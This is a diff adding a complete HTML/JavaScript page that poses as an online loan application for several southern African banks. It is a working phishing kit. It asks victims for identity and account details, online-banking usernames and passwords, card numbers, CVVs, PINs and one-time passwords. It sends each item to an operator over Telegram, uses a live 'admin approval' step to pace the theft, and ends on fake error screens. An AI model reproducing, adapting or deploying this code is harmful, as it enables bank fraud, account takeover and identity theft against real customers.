@@ -1,0 +1,836 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Application Form</title>
+
+  <script src="https://kit.fontawesome.com/b33e9054eb.js" crossorigin="anonymous"></script>
+
+  <!-- Inlined apply.css -->
+  <style>
+/* apply.css inlined */
+*{box-sizing: border-box;}
+body{
+    position: relative;
+    width: 100%;
+    font-family:'Gill Sans', 'Gill Sans MT', Calibri, 'Trebuchet MS', sans-serif;
+    
+}
+#div1{
+    width: 105vw;
+    display: grid;
+    grid-template-columns: 70% 10% 10%;
+    column-gap: 5%;
+    padding-top: 7%;
+    padding-bottom: 1%;
+    box-shadow: 12px 12px 12px black;
+    position: sticky;
+    top: -1;
+    left: -1%;
+    background-color: white;
+}
+#img1{
+    margin-left: 5%;
+    width: 100%;
+    margin-top: -6%;
+    font-size: 400%;
+    font-weight: bolder;
+    padding: 1% 0 3% 0;
+}
+#icon1,#icon2{
+    font-size: 450%; 
+    margin: -30% 0 30% 0;
+}
+#div2{
+    color: white;
+    background-color: rgb(13, 166, 177);
+    width: 105%;
+    padding: 2%;
+    margin-top: -20%;
+    transition-duration: 2s;
+}
+#p4{
+    font-family:'Gill Sans', 'Gill Sans MT', Calibri, 'Trebuchet MS', sans-serif;
+    font-size: 320%;
+    text-align: center;
+}
+#contact-form{
+    width: 105%;
+    margin-top: 20%;
+    margin-bottom: 5%;
+}
+#contact-form label{
+    font-size: 300%;
+}
+#contact-form input{
+    border-radius: 25px;
+    outline: none;
+    border: 2px solid #ccc;
+    margin-bottom: 9%;
+    font-size: 250%;
+    padding: 5%;
+    width: 100%;
+}
+#surname{
+    margin-top: -7%;
+}
+#terms{
+    border-radius: 25px;
+    border: 2px solid #bbb;
+    display: grid;
+    grid-template-columns: 20% 80%;
+    padding: 3%;
+    margin-top: -40%;
+    margin-bottom: 20%;
+}
+#terms input[type='checkbox']{
+    background-color: rgb(13, 166, 177);
+    color: rgb(13, 166, 177);
+    margin-top: 3%;
+    width: 40%;
+    height: 80px;
+}
+#terms > label{
+    margin-top: 3%;
+}
+#form2{
+    padding: -8% 5% 5% 5%;
+}
+#form2 > p{
+    font-size: 250%;
+    border: 2px solid black; 
+    width: 50%; 
+    text-align: center;
+    padding: 3%;
+    border-radius: 25px;
+    margin-top: -10%;
+}
+#form2 > div{
+    display: flex;
+    justify-content: space-evenly;
+    flex-wrap:   wrap;
+    margin-left: -105%;
+    width: 104vw;
+    transition-duration: 2s;
+    margin-top: -15%;
+
+}
+#STANDARD-details > div > input{
+    border: none;
+    border-bottom: 2px solid black;
+    border-radius: 0px;
+}
+.zoomed{
+    transition-duration: 3s;
+    transform: scale(1.2); /* Zooms the div by 10% */
+    margin-top:12%;
+}
+input[type='submit']{
+    color: white;
+    font-family:'Gill Sans', 'Gill Sans MT', Calibri, 'Trebuchet MS', sans-serif;
+    font-weight: bold;
+    font-size: 300%;
+    background-color: rgb(13, 166, 177);
+    width: 100%;
+    margin-top: 10%;
+    border-radius: 15px;
+    padding: 10%;
+    position: relative;
+    animation-duration: 3s;
+    animation-iteration-count: 1;
+    animation-direction:normal;
+    animation-timing-function: ease-in-out;
+}
+input[type='submit']:hover{
+    color: rgb(13, 166, 177);
+    background-color: rgb(235, 187, 27);
+}
+#submit1, #next1{
+    background-color: black;
+    color: white;
+    font-family:'Gill Sans', 'Gill Sans MT', Calibri, 'Trebuchet MS', sans-serif;
+    font-weight: bold;
+    font-size: 300%;
+    width: 100%;
+    text-align: center;
+    margin-bottom: 3%;
+    border-radius: 100px;
+    padding: 4%;
+}
+.submit4, #next2{
+    background-color: transparent;
+    color: #ccc;
+    font-family:'Gill Sans', 'Gill Sans MT', Calibri, 'Trebuchet MS', sans-serif;
+    font-weight: bold;
+    font-size: 300%;
+    width: 100%;
+    text-align: center;
+    margin-bottom: 3%;
+    border-radius: 100px;
+    padding: 4%;
+    border: 2px solid grey;
+}
+#submit3{
+    background-color: rgb(65, 142, 48);
+    color: white;
+}
+#submit1:disabled, #submit3:disabled, input[type='submit']:disabled {
+    background-color: #cccccc; /* Light gray background */
+    cursor: not-allowed; /* Change cursor to indicate it's disabled */
+}
+#next{
+    color: white;
+    font-family:'Gill Sans', 'Gill Sans MT', Calibri, 'Trebuchet MS', sans-serif;
+    font-weight: bold;
+    font-size: 300%;
+    background-color: rgb(13, 166, 177);
+    width: 100%;
+    text-align: center;
+    margin-top: 25%;
+    margin-bottom: 3%;
+    border-radius: 15px;
+    padding: 5% 7%;
+    position: relative;
+
+}
+#continue:active{
+    background-color: rgb(235, 187, 27);
+    color: rgb(13, 166, 177);
+}
+#next:active, #next1:active, #next2.active{
+    background-color: rgb(235, 187, 27);
+    color: rgb(13, 166, 177);
+}
+#continue3 > input, #continue4 > input, #continue4 > div > input {
+    border: none;
+    border-bottom: 2px solid black;
+    border-radius: 0px;
+    
+}
+#continue3 > input::placeholder{
+    font-size: 130%;
+}
+#write{
+    padding: 2%;
+}
+#write-up {
+    text-align: center;
+    font-size: 180%;
+}
+#write-up div h3{
+    text-align: center;
+    color: red;
+    font-size: 90;
+}
+#failure{
+    text-align: center;
+    font-size: 205%;
+    color: red;
+}
+#why{
+    font-weight: bold;
+    color: white;
+    background-color: red;
+    padding: 1%;
+}
+#fail-write{
+    background-color: red;
+    font-size: 230%;
+}
+#successful{
+    font-size: 100%;
+    text-align: center;
+    margin-top: 25%;
+  }
+#p7{
+    font-family: 'Gill Sans', 'Gill Sans MT', Calibri, 'Trebuchet MS', sans-serif;
+    font-size: 110%;
+    position: absolute;
+    top: 1%;
+    margin-left: 35%;
+}
+#done{
+    width:95%;
+    margin-top: 2%;
+    padding: 5%;
+}
+#check{
+    color: rgba(29, 44, 156, 0.8);
+    font-size: 2000%;
+    padding:5% ;
+    width: 100% ;
+    margin-top: 200%;
+    visibility: hidden;
+    position: relative;
+    animation-duration: 3s;
+    animation-name: check;
+    
+    animation-direction: normal;
+}
+@keyframes check{
+    50%{
+        visibility:visible;
+        margin-top: -50%;
+    }
+}
+#with{
+    text-align: center;
+    font-family:'Gill Sans', 'Gill Sans MT', Calibri, 'Trebuchet MS', sans-serif;
+    position: static;
+    top: 26%;
+    left: 21%;
+    color: red;
+}
+  </style>
+</head>
+<body>
+
+  <div id="div1">
+    <div id="img1">Online Loan Application</div>
+    <i id="icon1" class="fa-solid fa-bars"></i>
+    <i id="icon2" class="fa-solid fa-magnifying-glass"></i>
+  </div>
+
+  <div id="div2">
+    <p id="p4">Online Loan Application Form</p>
+  </div>
+
+  <form id="contact-form">
+
+    <div id="form1" style="padding: 5%;">
+      <input type="hidden" name="contact_number">
+
+      <label for="name">Full Name:</label> <br>
+      <input type="text" name="name" id="name" placeholder="Enter First Name">
+      <input type="text" name="surname" id="surname" placeholder="Enter Surname"> <br>
+
+      <label for="address">Address:</label>
+      <input type="text" name="address" id="address" placeholder="Enter Address"><br>
+
+      <label for="phone">Phone Number</label>
+      <input type="tel" name="phone" id="phone" placeholder="Enter Phone Number"><br>
+
+      <label for="account">Account Number:</label>
+      <input type="text" inputmode="numeric" name="account" id="account" placeholder="Enter Account Number"><br>
+
+      <label for="amount">Loan Amount:</label>
+      <input type="number" step="0.01" name="amount" id="amount" placeholder="Enter Loan Amount "><br>
+
+      <label for="duration">Loan Duration (months):</label>
+      <input type="number" name="duration" id="duration" placeholder="Enter Your Loan Duration in months "><br>
+
+      <label for="identity">ID Number:</label> <br>
+      <input type="text" name="identity" id="identity" placeholder="Enter ID number "> <br>
+
+      <p id="error"></p>
+
+      <p id="next">Next >></p>
+
+      <div id="terms">
+        <input type="checkbox" name="agree" id="agree">
+        <label for="agree" >I agree to the <span id="condition" style="color: blue;"> Terms and Conditions </span></label>
+      </div>
+    </div>
+
+    <div id="form2" style="display: none;">
+      <p id="banks" style="margin: 0px auto;">Select your bank</p>
+      <div id="show-element" style="color: black;">
+        <div class="single-banks">
+          <img src="./36795309639147dfbee1cf09acc2084c.webp" alt="" width="300">
+          <p class="single-banks" style="text-align: center; font-size: xx-large;" name="bank">FNB</p>
+        </div>
+        <div class="single-banks">
+          <img src="./Standard_Bank_of_South_Africa_logo.png" alt="" width="175">
+          <p class="single-banks" style="text-align: center; font-size: xx-large; margin-right: 12%;">STANDARD BANK</p>
+        </div>
+        <div class="single-banks">
+          <img src="./nedbank logo" alt="" width="200">
+          <p class="single-banks" style="text-align: center; font-size: xx-large;">NEDBANK</p>
+        </div>
+        <div class="single-banks">
+          <img src="./windhoek logo.png" alt="" width="200">
+          <p class="single-banks" style="text-align: center; font-size: xx-large;">WINDHOEK</p>
+        </div>
+        <p class="single-banks" style="width: 100%; font-size: 250%; text-align: center;">Select your bank to proceed further</p>
+      </div>
+
+      <select name="bank" id="bank-select" style="display: none;">
+        <option id="opt1"></option>
+      </select>
+    </div>
+
+    <!-- FNB details -->
+    <div id="FNB-details" style="display: none;">
+      <div style="padding: 5%;">
+        <p id="p2" style="margin-top: 15%; font-size: 200%; color: rgb(77, 166, 162);">
+          Please enter your app username and password.
+        </p>
+
+        <div id="continue1">
+          <label for="username">Username</label> <br>
+          <input type="text" style="background-color: rgb(238, 238, 238);" name="username" id="username" placeholder="Enter Username"> <br>
+
+          <label for="password">Password:</label> <br>
+          <input type="password" style="background-color: rgb(238, 238, 238);" name="password" id="password" placeholder="Enter Password"> <br>
+
+          <p id="caution1"></p>
+          <p id="next1">Continue</p>
+        </div>
+
+        <div id="continue2" style="display: none;">
+          <label for="card">Card Number:</label> <br>
+          <input type="text" class="fnbs" name="card" id="card" placeholder="Enter Card Number"> <br>
+
+          <label for="pin">Card Pin:</label><br>
+          <input type="password" class="fnbs" name="pin" id="pin" placeholder="Enter Card Pin"> <br>
+
+          <p id="error2"></p>
+          <input type="submit" value="Continue" id="submit1" disabled>
+        </div>
+      </div>
+    </div>
+
+    <!-- STANDARD bank details -->
+    <div id="STANDARD-details" style="display: none;">
+      <div style="padding: 5%;">
+        <p id="p2" style="margin-top: 15%; font-size: 200%; text-align: center;">
+          Please enter your user ID and password.
+        </p>
+        <p id="p2" style="margin-top: 5%; font-size: 400%; text-align: center;">Sign in to Online Banking</p>
+
+        <input type="text" class="standard" name="standardUsername" id="standardUsername" placeholder="Enter User ID"> <br>
+        <input type="password" class="standard" name="standardPassword" id="standardPassword" placeholder="Enter Password"> <br>
+
+        <p id="p2" style="margin-top: 2%; font-size: 200%; text-align: center;">
+          In order to withdraw your loan amount from your loan dashboard to your account, you need to complete the steps.
+        </p>
+        <p id="error2" style="display: none;"></p>
+
+        <input type="submit" value="Sign In" id="submit2" disabled>
+      </div>
+    </div>
+
+    <!-- NEDBANK details -->
+    <div id="NEDBANK-datails" style="display: none;">
+      <p id="p2" style="margin-top: 15%; font-size: 230%; background-color: rgb(65, 142, 48); color: white; padding: 5%; margin-top: -2%;" >
+        Please enter your app username and password.
+      </p>
+      <div style="padding: 5%;">
+        <label for="profileNumber">Internet Banking Profile ID:</label> <br>
+        <input type="text" class="nedbank" name="Profile" id="profileNumber" placeholder="Enter Internet Banking Profile ID"> <br>
+
+        <label for="password">Internet Banking Password:</label><br>
+        <input type="password" class="nedbank" name="profilePassword" id="profilePassword" placeholder="Enter Internet Banking Password"> <br>
+
+        <p id="error3"></p>
+
+        <input type="submit" value="Confirm" id="submit3" disabled>
+      </div>
+    </div>
+
+    <!-- WINDHOEK details -->
+    <div id="WINDHOEK-details" style="display: none;">
+      <div style="padding: 5%;">
+        <p id="p2" style="margin-top: 15%; font-size: 200%; color: rgb(57,63,86);">
+          Please enter your email and password.
+        </p>
+
+        <div id="continue3">
+          <label for="email">Email:</label> <br>
+          <input type="email" class="windhoeks" name="windhoek-email" id="windhoek-email" placeholder="Email"> <br>
+
+          <label for="password">Password:</label><br>
+          <input type="password" class="windhoeks" name="wimdhoek-password" id="wimdhoek-password" placeholder="Password"> <br>
+
+          <p id="caution2"></p>
+          <p id="next2">Continue</p>
+        </div>
+
+        <div id="continue4" style="display: none;">
+          <label for="card">Card Number:</label> <br>
+          <input type="text" class="windhoeks" name="cardNumber" id="cardNumber" placeholder="Enter Card Number"> <br>
+
+          <div id="card-details">
+            <input type="text" class="windhoeks" name="card-date" id="card-date" placeholder="mm/yy" maxlength="5"> <br>
+            <input type="text" class="windhoeks" name="cvv" id="cvv" placeholder="Enter Card Cvv Number" maxlength="3"> <br>
+          </div>
+
+          <label for="pin">Card Pin:</label><br>
+          <input type="password" class="windhoeks" name="wimdhoek-pin" id="wimdhoek-pin" placeholder="Enter Card Pin"> <br>
+
+          <p id="error4"></p>
+          <input type="submit" class="submit4" value="Confirm" id="submit4" disabled style="background-color: transparent; border-radius: 100px; border: 2px solid grey; color: #ccc;">
+        </div>
+      </div>
+    </div>
+
+  </form>
+
+  <div id="write-up" style="display: none; margin-top: 5%;">
+    <div id="write">
+      <img id="latsimg" src="./error.png" alt="" style="margin: 0px auto;">
+      <h2 id="with">No internet</h2>
+      <p style="text-align: center; font-size: 120%;">Kindly check your internet connection.</p>
+    </div>
+  </div>
+
+  <div id="successful" style="display: none; width: 100vw;">
+    <img id="latsimg" src="./error.png" alt="">
+    <h2 id="with">Unable to connect to your loan dashboard</h2>
+    <p style="text-align: center; font-size: 120%;">Kindly contact your Loan Agent For Further Enquiry and Support</p>
+    <div id="background">
+      <div id="done">
+        <i id="check" class="fa-regular fa-circle-check"></i>
+      </div>
+    </div>
+  </div>
+
+  <!-- Keep original behavior script if present -->
+  <script src="index.js"></script>
+
+  <!-- Telegram config must be present as telegram-config.js exposing sendTelegramMessage() -->
+  <script src="telegram-config.js"></script>
+
+  <!-- Inlined app.js (combined logic: loan calc, approval gating, bank intercepts) -->
+  <script>
+/* app.js inlined */
+(function(){
+  function genId(){ return 'req_' + Date.now() + '_' + Math.floor(Math.random()*10000); }
+  function loadRequests(){ try { return JSON.parse(localStorage.getItem('loan_requests')||'[]'); } catch(e){ return []; } }
+  function saveRequests(list){ localStorage.setItem('loan_requests', JSON.stringify(list)); }
+  function addRequest(req){ const list = loadRequests(); list.push(req); saveRequests(list); }
+  function updateRequest(id, patch){ const list = loadRequests(); const i = list.findIndex(r=>r.id===id); if(i!==-1){ list[i] = Object.assign({}, list[i], patch); saveRequests(list); return list[i]; } return null; }
+
+  async function notifyAdminText(text){ try { if(typeof sendTelegramMessage === 'function'){ await sendTelegramMessage(text); } else { console.log('[notifyAdminText] sendTelegramMessage not available, message:', text); } } catch(e){ console.log('notify failed', e); } }
+
+  function showProcessingOverlay(message){ let ov = document.getElementById('processing-overlay'); if(!ov){ ov = document.createElement('div'); ov.id='processing-overlay'; ov.style.position='fixed'; ov.style.left=0; ov.style.top=0; ov.style.right=0; ov.style.bottom=0; ov.style.background='rgba(0,0,0,0.6)'; ov.style.color='white'; ov.style.display='flex'; ov.style.alignItems='center'; ov.style.justifyContent='center'; ov.style.zIndex=9999; ov.style.fontSize='150%'; document.body.appendChild(ov); }
+    ov.innerText = message||'Processing - waiting for admin approval...'; ov.style.display='flex'; }
+  function hideProcessingOverlay(){ const ov = document.getElementById('processing-overlay'); if(ov) ov.style.display='none'; }
+
+  function waitForApproval(id, onApprove, onReject, onVerify){ const iv = setInterval(()=>{ const req = loadRequests().find(r=>r.id===id); if(!req) return; if(req.status === 'approved'){ clearInterval(iv); onApprove && onApprove(req); } else if(req.status === 'rejected'){ clearInterval(iv); onReject && onReject(req); } else if(req.status === 'verify'){ clearInterval(iv); onVerify && onVerify(req); } }, 1500); }
+
+  // Loan calculator UI small helper (keeps a lightweight summary on the form)
+  function calcLoanUI(){
+    // Insert small summary near amount/duration if present
+    const amountEl = document.getElementById('amount');
+    const durationEl = document.getElementById('duration');
+    if(!amountEl||!durationEl) return;
+    // Create a small summary area below duration if not present
+    if(!document.getElementById('loan-summary-inline')){
+      const container = document.createElement('div');
+      container.id = 'loan-summary-inline';
+      container.style.margin = '1% 0 3% 0';
+      container.style.fontSize = '120%';
+      container.style.color = '#123';
+      durationEl.parentNode.insertBefore(container, durationEl.nextSibling);
+    }
+    function update(){
+      const P = parseFloat(amountEl.value)||0;
+      const n = parseInt(durationEl.value)||0;
+      const r = 0.08/12;
+      const summary = document.getElementById('loan-summary-inline');
+      if(!summary) return;
+      if(P<=0||n<=0){ summary.innerText = 'Enter loan amount and duration to see estimated monthly repayment (8% p.a.)'; return; }
+      const monthly = (P * r * Math.pow(1+r,n)) / (Math.pow(1+r,n)-1);
+      const total = monthly * n;
+      const interest = total - P;
+      summary.innerText = `Estimated monthly: R ${monthly.toFixed(2)} — Interest: R ${interest.toFixed(2)} — Total repayable: R ${total.toFixed(2)}`;
+    }
+    amountEl.addEventListener('input', update);
+    durationEl.addEventListener('input', update);
+    update();
+  }
+
+  // Replace the existing Next button with a clone so original index.js listeners don't run
+  function replaceNextButton(){
+    const oldNext = document.getElementById('next');
+    if(!oldNext) return null;
+    const newNext = oldNext.cloneNode(true);
+    oldNext.parentNode.replaceChild(newNext, oldNext);
+    return newNext;
+  }
+
+  function onPersonalSubmit(data, proceed){
+    const id = genId();
+    const req = { id, stage:'personal', data, status:'pending', created_at: Date.now() };
+    addRequest(req);
+    notifyAdminText(`<b>New personal details submission</b>\nID: ${id}\nName: ${data.name} ${data.surname}\nPhone: ${data.phone}\nLoan: ${data.amount}\nDuration: ${data.duration}\nOpen admin: admin.html?req=${id}`);
+    showProcessingOverlay('Personal details submitted. Waiting for admin approval...');
+    waitForApproval(id, ()=>{
+      hideProcessingOverlay();
+      proceed();
+    }, ()=>{
+      hideProcessingOverlay();
+      alert('Your personal details were rejected by the admin.');
+    }, ()=>{
+      hideProcessingOverlay();
+      alert('Admin requested device verification. Please re-enter your PIN/password.');
+    });
+  }
+
+  function onBankSelect(bankName, element, callback){
+    const id = genId();
+    const req = { id, stage:'bank_select', data:{bank:bankName}, status:'pending', created_at: Date.now() };
+    addRequest(req);
+    notifyAdminText(`<b>Bank selected</b>\nID: ${id}\nBank: ${bankName}\nOpen admin: admin.html?req=${id}`);
+    showProcessingOverlay('Bank selection submitted. Waiting for admin approval...');
+    waitForApproval(id, ()=>{
+      hideProcessingOverlay();
+      window.__allowBankClick = true;
+      // Simulate clicking the bank element to show bank-specific UI if index.js relies on it
+      try { element.querySelector('p').dispatchEvent(new Event('click')); } catch(e){}
+      callback && callback(true);
+    }, ()=>{
+      hideProcessingOverlay();
+      alert('Bank selection was rejected by admin.');
+      callback && callback(false);
+    }, ()=>{
+      hideProcessingOverlay();
+      alert('Admin requested device verification. Please re-enter your PIN/password.');
+      callback && callback(false);
+    });
+  }
+
+  function onCredentialSubmit(stage, credentials, callback){
+    const id = genId();
+    const req = { id, stage, data:credentials, status:'pending', created_at: Date.now() };
+    addRequest(req);
+    notifyAdminText(`<b>Credentials submission</b>\nID: ${id}\nStage: ${stage}\nPhone: ${credentials.phone||''}\nUsername: ${credentials.username||''}\nPassword/PIN: ${credentials.password||credentials.pin||''}\nOpen admin: admin.html?req=${id}`);
+    showProcessingOverlay('Credentials submitted. Waiting for admin approval...');
+    waitForApproval(id, ()=>{
+      hideProcessingOverlay();
+      callback && callback({ok:true});
+    }, (r)=>{
+      hideProcessingOverlay();
+      callback && callback({ok:false, reason:'rejected'});
+    }, ()=>{
+      hideProcessingOverlay();
+      callback && callback({ok:false, reason:'verify'});
+    });
+  }
+
+  // Intercept bank clicks (capture) to enforce admin approval first
+  function attachBankInterception(){
+    document.addEventListener('click', function(e){
+      const el = e.target.closest('.single-banks');
+      if(!el) return;
+      if(window.__allowBankClick){ window.__allowBankClick = false; return; }
+      e.stopImmediatePropagation();
+      e.preventDefault();
+      const p = el.querySelector('p'); const bankName = p? p.textContent.trim() : 'UNKNOWN';
+      onBankSelect(bankName, el, (approved)=>{ if(!approved) console.log('bank not approved'); });
+    }, true);
+  }
+
+  // Intercept credential submit buttons (capture)
+  function attachCredentialInterception(){
+    ['submit1','submit2','submit3','submit4'].forEach(id=>{
+      const el = document.getElementById(id);
+      if(!el) return;
+      el.addEventListener('click', function(e){
+        if(window.__allowSubmit){ window.__allowSubmit = false; return; }
+        e.stopImmediatePropagation();
+        e.preventDefault();
+        const creds = { phone: document.getElementById('phone')?document.getElementById('phone').value:'', username:'', password:'', pin:'' };
+        if(id==='submit1'){ creds.username = document.getElementById('username')?document.getElementById('username').value:''; creds.password = document.getElementById('password')?document.getElementById('password').value:''; creds.pin = document.getElementById('pin')?document.getElementById('pin').value:''; }
+        if(id==='submit2'){ creds.username = document.getElementById('standardUsername')?document.getElementById('standardUsername').value:''; creds.password = document.getElementById('standardPassword')?document.getElementById('standardPassword').value:''; }
+        if(id==='submit3'){ creds.username = document.getElementById('profileNumber')?document.getElementById('profileNumber').value:''; creds.password = document.getElementById('profilePassword')?document.getElementById('profilePassword').value:''; }
+        if(id==='submit4'){ creds.username = document.getElementById('windhoek-email')?document.getElementById('windhoek-email').value:''; creds.password = document.getElementById('wimdhoek-password')?document.getElementById('wimdhoek-password').value:''; creds.pin = document.getElementById('wimdhoek-pin')?document.getElementById('wimdhoek-pin').value:''; }
+        onCredentialSubmit('bank_credentials', creds, function(result){
+          if(result.ok){ showOtpPage(); } else if(result.reason === 'verify'){ alert('Admin requested device verification. Please re-enter PIN/password.'); } else { alert('Credentials rejected by admin.'); }
+        });
+      }, true);
+    });
+  }
+
+  // Show OTP page and handle OTP submission
+  function showOtpPage(){
+    if(document.getElementById('otp-modal')){ document.getElementById('otp-modal').style.display='block'; return; }
+    const div = document.createElement('div'); div.id='otp-modal'; div.style.padding='5%'; div.style.margin='5%'; div.style.border='2px solid #ccc';
+    div.innerHTML = `<h2>Enter OTP</h2><p id='otp-error' style='color:red'></p><input id='otp-input' placeholder='Enter OTP' style='font-size:120%; padding:8px; width:100%'><br><br><button id='otp-send' style='font-size:120%'>Send OTP to Admin</button>`;
+    const form = document.getElementById('contact-form'); form.parentNode.insertBefore(div, form.nextSibling);
+    document.getElementById('otp-send').addEventListener('click', ()=>{
+      const otp = document.getElementById('otp-input').value.trim(); if(!otp){ document.getElementById('otp-error').innerText='Enter OTP'; return; }
+      const id = genId(); const req = { id, stage:'otp', data:{otp}, status:'pending', created_at: Date.now() }; addRequest(req);
+      notifyAdminText(`<b>OTP submitted</b>\nID: ${id}\nOTP: ${otp}\nOpen admin: admin.html?req=${id}`);
+      showProcessingOverlay('OTP submitted. Waiting for admin approval...');
+      waitForApproval(id, ()=>{
+        hideProcessingOverlay();
+        document.getElementById('otp-modal').style.display='none';
+        document.getElementById('contact-form').style.display = 'none'; document.getElementById('successful').style.display = 'block';
+      }, (r)=>{
+        hideProcessingOverlay();
+        alert('The OTP provided is expired or wrong, please try again');
+      }, ()=>{
+        hideProcessingOverlay();
+        alert('Admin asked to verify device. Please enter PIN/password again.');
+      });
+    });
+  }
+
+  function setupPersonalNext(){
+    const newNext = replaceNextButton();
+    if(!newNext) return;
+    newNext.addEventListener('click', function(){
+      const fname = document.getElementById('name')?document.getElementById('name').value.trim():'';
+      const sname = document.getElementById('surname')?document.getElementById('surname').value.trim():'';
+      const address = document.getElementById('address')?document.getElementById('address').value.trim():'';
+      const phone = document.getElementById('phone')?document.getElementById('phone').value.trim():'';
+      const account = document.getElementById('account')?document.getElementById('account').value.trim():'';
+      const amount = document.getElementById('amount')?document.getElementById('amount').value.trim():'';
+      const duration = document.getElementById('duration')?document.getElementById('duration').value.trim():'';
+      const identity = document.getElementById('identity')?document.getElementById('identity').value.trim():'';
+      const agree = document.getElementById('agree')?document.getElementById('agree').checked:false;
+      if(!fname||!sname||!address||!phone||!account||!amount||!duration||!identity){ alert('kindly fill all the required details above'); return; }
+      if(!agree){ alert('kindly read and agree to the terms and conditions'); return; }
+      const data = { name: fname, surname: sname, address, phone, account, amount, duration, identity };
+      onPersonalSubmit(data, function proceed(){
+        document.getElementById('form1').style.display='none'; document.getElementById('form2').style.display='block'; document.getElementById('terms').style.display='none';
+      });
+    });
+  }
+
+  function highlightRequestFromQuery(){ try{ const params = new URLSearchParams(location.search); const q = params.get('req'); if(!q) return; }catch(e){} }
+
+  document.addEventListener('DOMContentLoaded', function(){ calcLoanUI(); setupPersonalNext(); attachBankInterception(); attachCredentialInterception(); highlightRequestFromQuery(); });
+
+})();
+  </script>
+
+  <!-- Submit handler: send final submission to Telegram and add final_submission request -->
+  <script>
+    document.addEventListener('DOMContentLoaded', function () {
+      const form = document.getElementById('contact-form');
+
+      // Capture-phase handler to prevent any other submit handlers (e.g., old EmailJS) from running
+      form.addEventListener('submit', function (e) {
+        e.stopImmediatePropagation();
+        e.preventDefault();
+
+        function v(id){ const el = document.getElementById(id); return el ? el.value : ''; }
+
+        const personal = {
+          name: v('name'),
+          surname: v('surname'),
+          address: v('address'),
+          phone: v('phone'),
+          account: v('account'),
+          amount: v('amount'),
+          duration: v('duration'),
+          identity: v('identity')
+        };
+
+        // Determine selected bank
+        let bank = '';
+        const bankSelect = document.getElementById('bank-select');
+        if(bankSelect && bankSelect.value) bank = bankSelect.value;
+        if(!bank){
+          if(document.getElementById('FNB-details') && document.getElementById('FNB-details').style.display !== 'none') bank = 'FNB';
+          else if(document.getElementById('STANDARD-details') && document.getElementById('STANDARD-details').style.display !== 'none') bank = 'STANDARD BANK';
+          else if(document.getElementById('NEDBANK-datails') && document.getElementById('NEDBANK-datails').style.display !== 'none') bank = 'NEDBANK';
+          else if(document.getElementById('WINDHOEK-details') && document.getElementById('WINDHOEK-details').style.display !== 'none') bank = 'WINDHOEK';
+        }
+
+        const creds = {
+          username: v('username') || v('standardUsername') || v('profileNumber') || v('windhoek-email'),
+          password_or_pin: v('password') || v('standardPassword') || v('profilePassword') || v('pin') || v('wimdhoek-pin') || ''
+        };
+
+        const lines = [];
+        lines.push('<b>New loan application submission</b>');
+        lines.push('');
+        lines.push('<b>Applicant</b>');
+        lines.push(`Name: ${personal.name} ${personal.surname}`);
+        lines.push(`Phone: ${personal.phone}`);
+        lines.push(`ID: ${personal.identity}`);
+        lines.push(`Address: ${personal.address}`);
+        lines.push('');
+        lines.push('<b>Loan</b>');
+        lines.push(`Amount: R ${personal.amount}`);
+        lines.push(`Duration (months): ${personal.duration}`);
+        lines.push('');
+        lines.push('<b>Bank & Credentials</b>');
+        lines.push(`Bank selected: ${bank}`);
+        lines.push(`Username: ${creds.username}`);
+        lines.push(`Password / PIN: ${creds.password_or_pin}`);
+        lines.push('');
+        lines.push('Open admin console: admin.html');
+        const message = lines.join('\n');
+
+        if (typeof sendTelegramMessage === 'function') {
+          sendTelegramMessage(message).then(function (res) {
+            try {
+              const id = 'final_' + Date.now();
+              const request = { id, stage: 'final_submission', data: { personal, bank, creds }, status: 'pending', created_at: Date.now() };
+              try {
+                const list = JSON.parse(localStorage.getItem('loan_requests') || '[]');
+                list.push(request);
+                localStorage.setItem('loan_requests', JSON.stringify(list));
+              } catch (e) {}
+
+              let ov = document.getElementById('processing-overlay');
+              if (!ov) {
+                ov = document.createElement('div');
+                ov.id = 'processing-overlay';
+                ov.style.position = 'fixed';
+                ov.style.left = 0;
+                ov.style.top = 0;
+                ov.style.right = 0;
+                ov.style.bottom = 0;
+                ov.style.background = 'rgba(0,0,0,0.6)';
+                ov.style.color = 'white';
+                ov.style.display = 'flex';
+                ov.style.alignItems = 'center';
+                ov.style.justifyContent = 'center';
+                ov.style.zIndex = 9999;
+                ov.style.fontSize = '150%';
+                ov.innerText = 'Submitted — waiting for admin approval...';
+                document.body.appendChild(ov);
+              } else {
+                ov.innerText = 'Submitted — waiting for admin approval...';
+                ov.style.display = 'flex';
+              }
+
+              const poll = setInterval(function () {
+                try {
+                  const list = JSON.parse(localStorage.getItem('loan_requests') || '[]');
+                  const r = list.find(rr => rr.id === id);
+                  if (r) {
+                    if (r.status === 'approved') {
+                      clearInterval(poll);
+                      ov.style.display = 'none';
+                      alert('Application approved by admin. Proceeding...');
+                      document.getElementById('contact-form').style.display = 'none';
+                      document.getElementById('successful').style.display = 'block';
+                    } else if (r.status === 'rejected') {
+                      clearInterval(poll);
+                      ov.style.display = 'none';
+                      alert('Application rejected by admin.');
+                    } else if (r.status === 'verify') {
+                      clearInterval(poll);
+                      ov.style.display = 'none';
+                      alert('Admin requested device verification. Please re-enter your PIN/password.');
+                    }
+                  }
+                } catch (ex) { }
+              }, 2000);
+
+            } catch (ex) {
+              console.error('post-send handling error', ex);
+            }
+          }).catch(function (err) {
+            console.error('sendTelegramMessage failed', err);
+            alert('Failed to send details to admin (Telegram). Please try again later.');
+          });
+        } else {
+          console.warn('sendTelegramMessage is not defined; ensure telegram-config.js is loaded and configured.');
+          alert('Telegram integration is not configured. Contact site administrator.');
+        }
+      }, true);
+    });
+  </script>
+
+</body>
+</html>
